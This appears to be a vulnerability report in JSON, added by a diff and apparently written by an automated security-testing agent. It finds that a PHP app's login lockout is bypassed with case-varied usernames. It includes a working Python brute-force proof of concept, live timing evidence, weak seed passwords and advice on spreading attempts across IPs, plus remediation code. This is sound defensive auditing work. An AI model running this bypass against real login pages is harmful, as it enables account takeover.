@@ -1,0 +1,55 @@
+[
+  {
+    "id": "vuln-0001",
+    "title": "Login lockout can be bypassed via case-varied account identifiers (CI collation vs case-sensitive throttle key)",
+    "severity": "critical",
+    "timestamp": "2026-09-21 22:51:48 UTC",
+    "description": "The failed-login throttle keys its per-account bucket on the **exact username string** submitted, while the account lookup in `models/User.php` runs against MySQL columns using a **case-insensitive** collation (`utf8mb4_unicode_ci`). As a result, `ADMIN001`, `admin001`, `Admin001`, `aDmIn001`, … are treated as the *same account* for authentication but as *different accounts* for the 5-failures/15-minute lockout. An attacker can therefore multiply the effective brute-force budget for a target account by enumerating case permutations of its identifier (2^(alphanumeric characters)), defeating the per-account lockout.",
+    "impact": "The per-account brute-force lockout (the primary control for a small, predictable identifier space of numeric NIM/NIDN and alphanumeric NIP) can be bypassed for any account. For the admin identifier `ADMIN001` (8 characters) an attacker gains up to 2^8 = 256 distinct throttle buckets (realistically fewer, but dozens), drastically increasing the number of password guesses per account before any lock engages. Combined with weak/seed passwords (`admin123`, `password123`) this materially raises the likelihood of credential compromise and, for the administrator account, of full compromise of the discipline-management surface. The per-source-IP cap (15 failures / 900s) is the only remaining limiter and is defeated by distributing attempts across source addresses.",
+    "target": "http://172.17.112.1:8001",
+    "technical_analysis": "**Two asymmetric comparators.**\n\nAuthentication lookup (case-INSENSITIVE) — `models/User.php`:\n\n```php title=models/User.php startLineNumber=34 endLineNumber=38\n$stmt = $this->connect->prepare(\"SELECT * FROM {$table} WHERE {$identifierColumn} = ? LIMIT 1\");\n$stmt->execute([$username]);\n$user = $stmt->fetch(PDO::FETCH_ASSOC);\n```\n\nThe identity columns (`NIP`, `nidn`, `nim`) are declared `VARCHAR ... UNIQUE` with no explicit per-column collation, so the database/table default `utf8mb4_unicode_ci` applies. Under this collation `WHERE NIP = 'ADMIN001'` matches a stored `ADMIN001` for the input `admin001` too.\n\nThrottle key (case-SENSITIVE) — `helpers/login_throttle_helper.php`:\n\n```php title=helpers/login_throttle_helper.php startLineNumber=105 endLineNumber=118\n$actor = substr($username, 0, 32);\n...\n$where = \"event = 'login_fail'\n            AND created_at >= (NOW() - INTERVAL :window SECOND)\n            AND (actor_id = :actor_b OR ip = :ip_b)\";\n```\n\n`actor_id` is the raw submitted string, compared by the application/driver as a **binary/case-sensitive** value (the audit column is compared with `=` against this literal; the lock is computed per distinct submitted identifier). Each case variant of the identifier therefore produces its own failure count.\n\n**Empirical corroboration (live target).** Submitting a wrong password for two case variants of the same admin account both reached the bcrypt verifier (≈0.71–0.73 s, the cost-12 comparison path) rather than being rejected before it, proving the lookup matched the same underlying row for both spellings:\n\n```markdown\nADMIN001 / wrongpw   -> t=0.73s  \"Invalid username or password.\"\nadmin001 / wrongpw   -> t=0.71s  \"Invalid username or password.\"\n```\n\nBecause the durable throttle is keyed on `substr($username,0,32)` verbatim, five failures logged under `ADMIN001` do not increment the bucket consulted for `admin001`, and so on for each case mutation.\n\n**Existing regression coverage.** The project's `tests/security/LoginBruteForceSuite.php` covers the session-reset bypass (CWE-307) and the NUL-byte truncation (CWE-230) with fixed-case identifiers only; it does not exercise case variation, so this asymmetry is untested and unguarded.",
+    "poc_description": "1. Confirm the case-insensitive lookup: submit a wrong password for `ADMIN001` and for `admin001` (both from clean sessions). Both responses take the bcrypt-verification time (~0.7 s) and return the ordinary \"Invalid username or password\" message, showing both spellings resolve to the same account row.\n2. Exhaust the per-account budget for one spelling: submit 5 wrong passwords using `ADMIN001`; the 6th attempt for `ADMIN001` is refused with \"Terlalu banyak percobaan gagal\" (locked).\n3. Switch the spelling: submit a login for `admin001` (or `Admin001`, `aDmIn001`, …). It is processed normally (ordinary failure), not refused — the throttle bucket for that spelling is empty.\n4. Repeat across the 2^N case permutations of the identifier to obtain a multiplied guessing budget for the same account. A correct password discovered under any spelling authenticates (the lookup is case-insensitive).\n5. Note: the per-source-IP cap (15 failures/900 s) still throttles a single source; distributing attempts across source addresses removes this limiter.",
+    "poc_script_code": "```python\nimport re, time, requests, urllib3\nurllib3.disable_warnings()\nBASE = \"http://172.17.112.1:8001\"\n\ndef attempt(username, password, user_type=\"admin\"):\n    s = requests.Session()\n    page = s.get(BASE + \"/login\", timeout=15).text\n    tok = re.search(r'name=\"csrf_token\" value=\"([^\"]+)\"', page).group(1)\n    t0 = time.time()\n    r = s.post(BASE + \"/action/login\",\n               data={\"csrf_token\": tok, \"user_type\": user_type,\n                     \"username\": username, \"password\": password},\n               headers={\"Content-Type\": \"application/x-www-form-urlencoded\"},\n               timeout=20, allow_redirects=True)\n    return r.status_code, time.time() - t0, (\"Terlalu banyak\" in r.text)\n\n# 1. Both spellings resolve to the same account row (bcrypt path ~0.7s).\nprint(attempt(\"ADMIN001\", \"wrong\"))   # (200, ~0.7, False)\nprint(attempt(\"admin001\", \"wrong\"))   # (200, ~0.7, False)\n\n# 2. Exhaust one spelling's budget (5 fails -> locked on 6th).\nfor i in range(6):\n    print(\"ADMIN001\", i, attempt(\"ADMIN001\", f\"bad{i}\"))  # 6th -> locked True\n\n# 3. A different spelling is a fresh bucket -> still processed.\nprint(\"admin001\", attempt(\"admin001\", \"bad\"))            # locked False  <-- bypass\n```",
+    "remediation_steps": "Normalize the account identifier to a single canonical form before it is used for **both** authentication and throttling, so the two comparators are guaranteed identical. Concretely: define the identity field as case-sensitive end-to-end (declare the identity columns with a binary/case-sensitive collation such as `utf8mb4_bin`, so case variants no longer resolve to the same row), and/or canonicalize the submitted identifier once (`strtolower(trim(...))` for the alphanumeric NIP, exact form for numeric NIM/NIDN) and use the canonical value for the lookup, the audit `actor_id`, and the throttle key. If case-insensitive identity is intended, then the throttle must key on the same case-folded value the lookup uses. Add a regression test that locks one case spelling and asserts a differently-cased spelling of the same identifier is also locked. Keep the per-source-IP cap, and add a global/progressive delay so rotating identifiers cannot multiply the budget.",
+    "evidence": "Live differential timing proving both case spellings reach the same account row (bcrypt cost-12 path ≈0.7 s), versus the throttle short-circuit (≈0.04–0.1 s):\n\n```markdown\nADMIN001 / wrongpw   -> status=200  t=0.73s  \"Invalid username or password.\"\nadmin001 / wrongpw   -> status=200  t=0.71s  \"Invalid username or password.\"\n```\n\nLock behaviour within a single identifier spelling (5 failures → locked on the 6th):\n\n```markdown\nattempt 1: t=0.711s msg='Invalid username or password.'\nattempt 2: t=0.711s msg='Invalid username or password.'\nattempt 3: t=0.702s msg='Invalid username or password.'\nattempt 4: t=0.697s msg='Invalid username or password.'\nattempt 5: t=0.706s msg='Invalid username or password.'\nattempt 6: t=0.111s msg='Terlalu banyak percobaan gagal. Coba lagi beberapa menit.'\n```\n\nThrottle key construction (verbatim submitted string, no case folding):\n\n```php title=helpers/login_throttle_helper.php startLineNumber=105 endLineNumber=106\n$actor = substr($username, 0, 32);\n```",
+    "assumptions": "Assumes the identity columns inherit a case-insensitive collation (the observed live behaviour confirms the lookup is case-insensitive for the admin NIP). The case-variant bypass is bounded per source IP by the existing 15-failures/900-second IP cap; the finding is most impactful when the attacker can distribute attempts across source addresses, or when combined with the account-level budget on a small, predictable identifier space. The end-to-end \"lock one spelling, then succeed on another spelling\" confirmation was constrained by the shared-source IP cap during the assessment; the case-insensitive lookup and the case-sensitive throttle key are both confirmed independently.",
+    "fix_effort": "low",
+    "cvss": 9.1,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "N",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "H",
+      "integrity": "H",
+      "availability": "N"
+    },
+    "endpoint": "/action/login",
+    "method": "POST",
+    "cwe": "CWE-307",
+    "code_locations": [
+      {
+        "file": "helpers/login_throttle_helper.php",
+        "start_line": 105,
+        "end_line": 106,
+        "snippet": "        $actor = substr($username, 0, 32);",
+        "label": "Throttle key uses the raw submitted identifier (case-sensitive) while the DB lookup is case-insensitive",
+        "fix_before": "        $actor = substr($username, 0, 32);",
+        "fix_after": "        // Canonicalize the identifier so the throttle bucket matches the\n        // case-insensitive identity lookup in models/User.php (utf8mb4_unicode_ci).\n        // Otherwise case variants of the same account each get a fresh budget.\n        $actor = substr(strtolower(trim($username)), 0, 32);"
+      },
+      {
+        "file": "request/handler-login.php",
+        "start_line": 22,
+        "end_line": 22,
+        "snippet": "        $username = trim((string) ($_POST['username'] ?? ''));",
+        "label": "Canonicalize once at the entry point and use the same value for lookup + audit + throttle",
+        "fix_before": "        $username = trim((string) ($_POST['username'] ?? ''));",
+        "fix_after": "        $username = trim((string) ($_POST['username'] ?? ''));\n        // Case-fold the alphanumeric identifier so authentication and throttling\n        // key on the same canonical value (NIM/NIDN are numeric and unaffected).\n        $username = strtolower($username);"
+      }
+    ],
+    "finding_class": "dynamic",
+    "agent_id": "d9942fd2",
+    "agent_name": "Strix"
+  }
+]
